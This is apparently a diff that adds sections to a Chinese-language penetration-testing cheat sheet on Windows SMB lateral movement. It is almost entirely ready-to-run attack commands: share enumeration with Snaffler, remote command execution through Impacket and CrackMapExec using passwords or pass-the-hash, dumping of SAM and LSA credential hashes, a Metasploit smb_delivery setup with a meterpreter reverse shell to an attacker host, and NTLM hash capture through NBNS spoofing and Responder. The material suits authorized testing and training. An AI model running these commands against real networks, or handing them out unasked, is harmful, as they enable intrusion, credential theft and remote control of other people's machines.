@@ -108,3 +108,104 @@ nbtstat -A IP地址  //读取本地计算机和远程计算机的 NetBIOS 名称
 net user \\IP地址\share  //连接指定共享目录
 net use
 ```
+
+### 域共享文件夹枚举
+
+```Bash
+https://github.com/SnaffCon/Snaffler
+Snaffler.exe -s -d domain.local -o snaffler.log -v data
+sudo crackmapexec smb 10 -u username -p pass -M spider_plus --share 'Department Shares'
+```
+
+## 执行系统命令
+
+### Impacket
+
+```Bash
+/usr/share/doc/python3-impacket/examples
+python smbexec.py -p 445 域/用户:密码@IP地址 -shell-type cmd/powershell
+python atexec.py 域/用户名:密码@IP地址 命令
+python psexec.py 域/用户名:密码@IP地址
+psexec \\\\<目标IP> -u <用户名> -p <密码> cmd.exe /c "要执行的命令"
+python wmiexec.py 域/用户名:密码@IP地址
+python dcomexec.py 域/用户名:密码@IP地址
+```
+
+```Bash
+./psexec.py [[domain/]username[:password]@]<targetName or address>
+./psexec.py -hashes <LM:NT> administrator@10.10.10.103
+psexec \\192.168.122.66 -u Administrator -p 123456Ww
+psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t
+
+./wmiexec.py [[domain/]username[:password]@]<targetName or address>
+./wmiexec.py -hashes LM:NT administrator@10.10.10.103
+
+./dcomexec.py [[domain/]username[:password]@]<targetName or address>
+./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103
+
+./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
+./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
+```
+
+### CrackMapExec
+
+```Bash
+crackmapexec smb IP地址 -u 用户名 -p 密码 -x 命令
+
+crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' //执行Powershell
+crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami  //执行cmd
+crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami
+# --exec-method {mmcexec,smbexec,atexec,wmiexec}
+
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute
+
+crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
+```
+
+### Metasploit
+
+```Bash
+exploit/windows/smb/psexec
+```
+
+## 窃取NTLM
+
+### exploit/windows/smb/smb_delivery
+
+```Bash
+use exploit/windows/smb/smb_delivery
+set payload windows/meterpreter/reverse_tcp
+set srvhost 攻击者主机IP地址
+exploit
+```
+
+### 捕获响应
+
+```Bash
+use auxiliary/server/capture/smb
+set srvhost 攻击者主机IP地址
+set johnpwfile /root/
+exploit
+```
+
+```Bash
+use auxiliary/spoof/nbns/nbns_response
+set spoofip 重定向地址
+set interface eth0
+exploit
+```
+
+### Responder
+
+```Bash
+responder -I eth0 -wF
+```
